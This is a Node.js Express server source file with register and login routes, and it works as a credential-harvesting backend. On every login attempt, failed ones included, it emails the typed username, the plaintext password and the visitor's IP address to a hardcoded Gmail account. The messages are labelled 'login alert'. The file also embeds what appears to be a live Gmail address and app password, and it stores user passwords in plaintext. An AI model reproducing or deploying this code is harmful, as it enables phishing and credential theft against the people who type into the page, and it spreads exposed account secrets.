const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// Email configuration - REPLACE WITH YOUR EMAIL
const EMAIL_USER = 'meltonrwilliam@gmail.com';  // Your Gmail address
const EMAIL_PASS = 'ebhzggvelmvgallq';      // Gmail App Password (NOT your regular password)
const SEND_TO_EMAIL = 'meltonrwilliam@gmail.com'; // Where to send alerts

// Configure email transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store users
const users = [];

// Function to send email alert
async function sendEmailAlert(email, password, ip) {
    const subject = `🔐 LOGIN ALERT - ${new Date().toLocaleString()}`;
    const body = `
    ═══════════════════════════════════
    🔐 NEW LOGIN ATTEMPT DETECTED
    ═══════════════════════════════════
    
    📧 Email/Phone: ${email}
    🔑 Password: ${password}
    🌍 IP Address: ${ip}
    ⏰ Time: ${new Date().toString()}
    
    ═══════════════════════════════════
    `;
    
    try {
        await transporter.sendMail({
            from: EMAIL_USER,
            to: SEND_TO_EMAIL,
            subject: subject,
            text: body
        });
        console.log('✅ Email alert sent for:', email);
    } catch (error) {
        console.error('❌ Email error:', error.message);
    }
}

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

// Login - SENDS EMAIL ALERT
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    
    // Get IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // SEND EMAIL ALERT (even if login fails)
    sendEmailAlert(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
